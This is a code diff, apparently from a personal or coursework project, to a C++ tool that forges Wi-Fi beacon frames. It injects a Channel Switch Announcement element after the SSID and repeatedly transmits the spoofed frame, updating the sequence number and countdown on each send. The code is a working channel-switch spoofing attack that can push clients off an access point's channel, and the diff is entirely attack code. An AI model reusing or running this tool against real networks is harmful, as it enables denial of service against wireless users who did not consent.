@@ -6,7 +6,7 @@
 #include "ie.h"
 #include "radiotap.h"
 #include "config.h"
-
+#include "packet_utils.h"
 
 void usage()
 {
@@ -55,63 +55,43 @@ int main(int argc, char* argv[]) {
     ieee80211_mac_header* mac_header = (ieee80211_mac_header*)(packet + radiotap_len);
     size_t mac_header_len = sizeof(ieee80211_mac_header); // TODO : MAC Header 길이 계산 (QoS, HT 등 옵션에 따라 달라질 수 있음)
 
-    //=========Make CSA frame=========
+    // ============================= Make CSA frame =============================
 
     std::cout << "Current Channel: " << config.ap_current_channel << std::endl;
     int switchChannel = setSwitchChannel(config.ap_current_channel);
-    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(11, 0); // 11번 채널 고정
+    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(switchChannel, CSA_COUNT);
 
-    //=========Parse beacon frame body=========
+    InsertData csa_insert = 
+    {
+        .pos = find_ie_end_by_tag(ieee80211_IE::SSID, packet, radiotap_len, mac_header_len, sizeof(beacon_frame_body), total_packet_len),
+        .data = reinterpret_cast<const uint8_t*>(&csa_ie),
+        .len = sizeof(csa_ie)
+    };
+    std::vector<InsertData> insert_data = { csa_insert };
+
+
+    // ============================= Parse beacon frame body  =============================
+
     beacon_frame_body* frame_body = (beacon_frame_body*)(packet + radiotap_len + mac_header_len);
 
-    //Beacon Frame Body에서 IE 순회하면서 CSA IE 삽입할 위치 확인
-    const uint8_t* ptr = packet + radiotap_len + mac_header_len + sizeof(beacon_frame_body);
-    const uint8_t* end = packet + total_packet_len;
-    const uint8_t* insert_pos = nullptr;
 
-    while (ptr + 2 <= end) 
-    {
-        uint8_t tag = ptr[0];
-        uint8_t len = ptr[1];
-
-        if (ptr + 2 + len > end) break; 
-
-        if (tag == ieee80211_IE::SSID) 
-        { // SSIDs보다 뒤에 삽입해야하므로 SSID IE 발견 시점에서 삽입 위치 설정
-            insert_pos = ptr + 2 + len; // "뒤"에 삽입
-            break;
-        }
-        ptr += 2 + len;
-    }
 
     //============================= 패킷 생성 =============================
 
-    // 전체 길이 = 기존 + CSA IE
-    int new_packet_len = total_packet_len + sizeof(csa_ie);
-
-    // 새 버퍼 생성
-    u_char* new_packet = new u_char[new_packet_len];
-
-    // 앞부분 복사 
-    // packet 시작 ~ insert_pos 전까지
-    size_t front_len = insert_pos - packet;
-    memcpy(new_packet, packet, front_len);
-
-    // CSA 삽입
-    memcpy(new_packet + front_len, &csa_ie, sizeof(csa_ie));
-
-    //뒷부분 복사
-    // insert_pos ~ 끝까지
-    size_t back_len = total_packet_len - front_len;
-    memcpy(new_packet + front_len + sizeof(csa_ie), insert_pos, back_len);
+    size_t new_packet_len = 0;
+    u_char* new_packet = inject_data_into_packet(packet, total_packet_len, insert_data, new_packet_len);
 
 
-    //추가 디테일
-    //TODO : RadioTap + Beacon 타임스탬프 설정
-
-    //TODO : Beacon Interval 설정
-
-    //TODO : SN 설정
+    //============================= 패킷 조정 =============================
+    //FCS 제거 (Radiotap의 FCS 비트 확인 후, FCS가 포함된 패킷이면 마지막 4바이트 제거)
+    std::cout << "isFCS(packet) = " << isFCS(packet) << std::endl;
+    std::cout << "before trim new_packet_len = " << new_packet_len << std::endl;
+    if (isFCS(packet))
+    {
+        std::cout << "FCS detected, removing FCS from packet" << std::endl;
+        new_packet_len -= 4;
+        std::cout << "after trim new_packet_len = " << new_packet_len << std::endl;
+    }
 
     // 디버깅
     dump(new_packet, new_packet_len);
@@ -130,6 +110,18 @@ int main(int argc, char* argv[]) {
             std::cout << "Sent CSA frame to AP " << cnt << ": " << (std::string)config.ap_mac << " to switch to channel " << (int)csa_ie.new_channel_number << std::endl;
         }
         cnt++;
+
+        updateSN(new_packet);
+        int count = updateCSACount(new_packet);
+        std::cout << count << "번 전송 후 CSA Count 감소" << std::endl;
+
+        if(count ==0) 
+        {
+            std::cout << "CSA Count reached 0, 잠시 대기후 다시 처음부터 전송" << std::endl;
+            usleep(3000000); // 3초 대기
+            continue;
+
+        }
         usleep(200000); //1초마다 전송
     }
 
